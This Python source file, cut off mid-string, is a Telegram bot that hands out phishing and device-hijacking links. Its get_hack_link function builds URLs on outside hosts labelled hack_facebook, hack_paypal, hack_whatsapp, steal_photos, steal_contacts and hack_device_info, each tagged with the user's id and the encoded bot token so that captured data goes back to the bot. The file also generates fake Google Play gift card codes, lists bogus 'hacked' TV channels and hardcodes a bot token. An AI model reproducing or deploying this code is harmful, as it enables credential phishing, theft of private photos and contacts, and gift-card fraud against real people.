import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import sqlite3
import time
import logging
import json
import re
import requests
import urllib.parse
import traceback
import os
import base64
import secrets
import string
import random
from datetime import datetime, timedelta

BOT_TOKEN = "8625802970:AAHO5SyEW4acduEF5JWjfckA3AEfSDmoVIU"
MAIN_ADMIN_ID = 6408034985
OWNER_NAME = "TROLEX"
OWNER_USERNAME = "@trolex00"
OWNER_LINK = "https://t.me/trolex00"

DB_FILE = "database.sqlite"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== healing functionsر ====================
def encode_token(token):
    return base64.b64encode(token.encode()).decode()

def decode_token(encoded):
    try:
        return base64.b64decode(encoded).decode()
    except:
        return encoded

# ==================== Google Play card generator functions ====================
def generate_google_play_code():
    """Generate a random Google Play gift card code"""
    groups = []
    for _ in range(4):
        group = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(4))
        groups.append(group)
    return '-'.join(groups)

def generate_random_date(start_year=2024, end_year=2027):
    """Generate a random date"""
    start_date = datetime(start_year, 1, 1)
    end_date = datetime(end_year, 12, 31)
    delta = end_date - start_date
    random_days = random.randint(0, delta.days)
    return start_date + timedelta(days=random_days)

def generate_google_play_card():
    """Generate a random Google Play gift card"""
    # Random code
    code = generate_google_play_code()
    
    # Random value between $20 and $80
    value = random.randint(20, 80)
    
    # Release date (from 2024 to 2025)
    issue_date = generate_random_date(2024, 2025)
    
    # Expiration date (one to two years after release)
    expiry_date = issue_date + timedelta(days=random.randint(365, 730))
    
    # Random serial number (12 digits)
    serial = ''.join(str(random.randint(0, 9)) for _ in range(12))
    
    return {
        'code': code,
        'value': value,
        'issue_date': issue_date.strftime('%Y-%m-%d'),
        'expiry_date': expiry_date.strftime('%Y-%m-%d'),
        'serial': serial
    }

# ==================== Password generation module ====================
def generate_strong_password():
    # Capital letters H
    uppercase = string.ascii_uppercase
    # lowercase letters h
    lowercase = string.ascii_lowercase
    # numbers 1
    digits = string.digits
    # symbols #
    symbols = "#$"
    
    # Merge all letters
    all_chars = uppercase + lowercase + digits + symbols
    
    # Make sure there is at least one letter of each type.
    password = [
        secrets.choice(uppercase),
        secrets.choice(lowercase),
        secrets.choice(digits),
        secrets.choice(symbols)
    ]
    
    # Complete the rest randomly
    for _ in range(12):  # 16 - 4 = 12
        password.append(secrets.choice(all_chars))
    
    # Word confusion
    secrets.SystemRandom().shuffle(password)
    
    return ''.join(password)

# ==================== Database setup ====================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        first_name TEXT,
        username TEXT,
        join_date TEXT,
        points INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        user_id INTEGER PRIMARY KEY
    )''')
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (MAIN_ADMIN_ID,))
    
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_points (
        user_id INTEGER PRIMARY KEY,
        points INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_states (
        chat_id INTEGER PRIMARY KEY,
        state TEXT,
        data TEXT
    )''')
    
    conn.commit()
    conn.close()
    logger.info("✅ The database has been configured")

def get_pdo():
    return sqlite3.connect(DB_FILE)

def get_user_points(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT points FROM user_points WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else 0
    except Exception as e:
        logger.error(f"Error in retrieving points: {e}")
        return 0

def add_points(user_id, points):
    try:
        conn = get_pdo()
        c = conn.cursor()
        current = get_user_points(user_id)
        c.execute("INSERT OR REPLACE INTO user_points (user_id, points) VALUES (?, ?)", (user_id, current + points))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error in adding points: {e}")

def is_admin(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except Exception as e:
        logger.error(f"Supervisor verification error: {e}")
        return False

def add_admin(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error adding administrator: {e}")

def remove_admin(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error deleting administrator: {e}")

def is_banned(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except Exception as e:
        logger.error(f"Block verification error: {e}")
        return False

def ban_user(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"User blocking error: {e}")

def unban_user(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error unblocking user: {e}")

def register_user(user_id, first_name, username=None):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, first_name, username, join_date) VALUES (?, ?, ?, ?)",
                  (user_id, first_name, username, time.strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"User registration error: {e}")

def get_user_state(chat_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT state, data FROM user_states WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            try:
                data = json.loads(result[1]) if result[1] else {}
                return {'state': result[0], 'data': data}
            except json.JSONDecodeError:
                return {'state': result[0], 'data': {}}
        return None
    except Exception as e:
        logger.error(f"Error fetching user state: {e}")
        return None

def set_user_state(chat_id, state, data=None):
    try:
        conn = get_pdo()
        c = conn.cursor()
        json_data = json.dumps(data) if data else '{}'
        c.execute("INSERT OR REPLACE INTO user_states (chat_id, state, data) VALUES (?, ?, ?)",
                  (chat_id, state, json_data))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error setting user status: {e}")

def delete_user_state(chat_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM user_states WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error deleting user status: {e}")

# ==================== hacking links ====================
def get_hack_link(link_type, user_id):
    encoded_token = encode_token(BOT_TOKEN)
    
    links = {
        'hk_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index1.php?id={user_id}&tok={encoded_token}",
        'hack_faok': f"https://dev-alol-bot.pantheonsite.io/1/index.php?id={user_id}&tok={encoded_token}",
        'hpck_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index3.php?id={user_id}&tok={encoded_token}",
        'hook_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index2.php?id={user_id}&tok={encoded_token}",
        'hack_whatsapp': f"https://dev-alol-bot.pantheonsite.io/1/index6.php?id={user_id}&tok={encoded_token}",
        'hack_instagram': f"https://dev-alol-bot.pantheonsite.io/1/index5.php?id={user_id}&tok={encoded_token}",
        'hack_wifi': f"https://dev-alol-bot.pantheonsite.io/1/index7.php?id={user_id}&tok={encoded_token}",
        'hack_freefire': f"https://dev-alol-bot.pantheonsite.io/1/index12.php?id={user_id}&tok={encoded_token}",
        'hack_freefire_lite': f"https://dev-alol-bot.pantheonsite.io/1/index16.php?id={user_id}&tok={encoded_token}",
        'hack_snapchat': f"https://dev-alol-bot.pantheonsite.io/1/index14.php?id={user_id}&tok={encoded_token}",
        'hack_youtube': f"https://dev-alol-bot.pantheonsite.io/1/index17.php?id={user_id}&tok={encoded_token}",
        'hack_facebook': f"https://dev-alol-bot.pantheonsite.io/1/index10.php?id={user_id}&tok={encoded_token}",
        'hack_tiktok_main': f"https://dev-alol-bot.pantheonsite.io/1/index13.php?id={user_id}&tok={encoded_token}",
        'hack_paypal': f"https://dev-alol-bot.pantheonsite.io/1/index8.php?id={user_id}&tok={encoded_token}",
        'hack_quai': f"https://dev-alol-bot.pantheonsite.io/1/index15.php?id={user_id}&tok={encoded_token}",
        'hack_twitter': f"https://dev-alol-bot.pantheonsite.io/1/index11.php?id={user_id}&tok={encoded_token}",
        'hack_netflix': f"https://dev-alol-bot.pantheonsite.io/1/index9.php?id={user_id}&tok={encoded_token}",
        'hack_ip': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/ip.php?id={user_id}&tok={encoded_token}",
        'hack_device_info': f"https://dev-alol-bot.pantheonsite.io/1/index4.php?id={user_id}&tok={encoded_token}",
        'steal_photos': f"https://dev-alol-bot.pantheonsite.io/1/index18.php?id={user_id}&tok={encoded_token}",
        'hack_google': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index5.html?id={user_id}&tok={encoded_token}",
        'hack_telegram': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index6.html?id={user_id}&tok={encoded_token}",
        'hack_discord': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index7.html?id={user_id}&tok={encoded_token}",
        'steal_contacts': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/contacts.html?id={user_id}&tok={encoded_token}",
    }
    
    return links.get(link_type, None)

# ==================== Television channel functions ====================
def get_tv_channels_by_country(country_code):
    channels = []
    if country_code == 'egypt':
        channels = ["📺 A new channel has been hacked:\nhttps://www.masrplay.xyz/"]
        for i in range(1, 51):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'saudi':
        channels = ["📺 A new channel has been hacked:\nhttps://www.mbc.net/"]
        for i in range(1, 41):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'uae':
        channels = ["📺 A new channel has been hacked:\nhttps://www.dmi.ae/"]
        for i in range(1, 43):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'kuwait':
        channels = ["📺 A new channel has been hacked:\nhttps://www.kuna.net.kw/"]
        for i in range(1, 46):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'qatar':
        channels = ["📺 A new channel has been hacked:\nhttps://www.aljazeera.net/"]
        for i in range(1, 47):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'bahrain':
        channels = ["📺 A new channel has been hacked:\nhttps://www.bna.bh/"]
        for i in range(1, 49):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'oman':
        channels = ["📺 A new channel has been hacked:\nhttps://www.oman-tv.gov.om/"]
        for i in range(1, 50):
            channels.append(f"📺 تم اختراق قناة جديدة:\nhttps://www.mbc{i}.com/")
    elif country_code == 'jordan':
        channels = ["📺 A new channel has been hacked:\nhttps://www.jrtv.jo/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'lebanon':
        channels = ["📺 A new channel has been hacked:\nhttps://www.teleliban.com/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'palestine':
        channels = ["📺 A new channel has been hacked:\nhttps://www.pbc.ps/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'iraq':
        channels = ["📺 A new channel has been hacked:\nhttps://www.imn.iq/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'syria':
        channels = ["📺 A new channel has been hacked:\nhttps://www.ortas.online/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'yemen':
        channels = ["📺 A new channel has been hacked:\nhttps://www.yementv.net/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'libya':
        channels = ["📺 A new channel has been hacked:\nhttps://www.ljtv.ly/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'tunisia':
        channels = ["📺 A new channel has been hacked:\nhttps://www.tunisiatv.tn/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'algeria':
        channels = ["📺 A new channel has been hacked:\nhttps://www.entv.dz/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'morocco':
        channels = ["📺 A new channel has been hacked:\nhttps://www.snrt.ma/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'sudan':
        channels = ["📺 A new channel has been hacked:\nhttps://www.sudantv.net/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'somalia':
        channels = ["📺 A new channel has been hacked:\nhttps://www.sntv.so/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'mauritania':
        channels = ["📺 A new channel has been hacked:\nhttps://www.rmi.mr/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    else:
        channels = ["📺 There are currently no channels available for this country.."]
    return channels

# ==================== Support Services Functions ====================
def get_ip_info(ip):
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return False
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=10)
        data = response.json()
        if data.get('status') == 'success':
            return data
    except:
        pass
    return False

def get_video_download_link(url):
    if not url:
        return False
    if 'tiktok.com' in url or 'vt.tiktok.com' in url:
        try:
            response = requests.get(f"https://tikwm.com/api/?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data', {}).get('play'):
                return {'type': 'video', 'url': data['data']['play']}
        except:
            pass
    if 'instagram.com' in url:
        try:
            response = requests.get(f"https://api.agatz.xyz/api/igdl?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data') and data['data'][0].get('url'):
                return {'type': 'video', 'url': data['data'][0]['url']}
        except:
            pass
    if 'youtube.com' in url or 'youtu.be' in url:
        try:
            response = requests.get(f"https://api.agatz.xyz/api/ytmp4?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data', {}).get('download'):
                return {'type': 'video', 'url': data['data']['download']}
        except:
            pass
    return False

def shorten_url(long_url):
    try:
        response = requests.get(f"https://is.gd/create.php?format=simple&url={urllib.parse.quote(long_url)}", timeout=10)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return False

def text_to_speech(text):
    try:
        url = f"https://translate.google.com/translate_tts?ie=UTF-8&q={urllib.parse.quote(text)}&tl=ar&client=tw-ob"
        return url
    except:
        return False

def get_webhook_info(bot_token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/getWebhookInfo", timeout=10)
        data = response.json()
        if data.get('ok'):
            return data.get('result')
    except:
        pass
    return None

def set_webhook(bot_token, url):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/setWebhook?url={urllib.parse.quote(url)}", timeout=10)
        return response.json()
    except:
        return None

def delete_webhook(bot_token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/deleteWebhook", timeout=10)
        return response.json()
    except:
        return None

# ==================== القوائم ====================
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("Rear camera h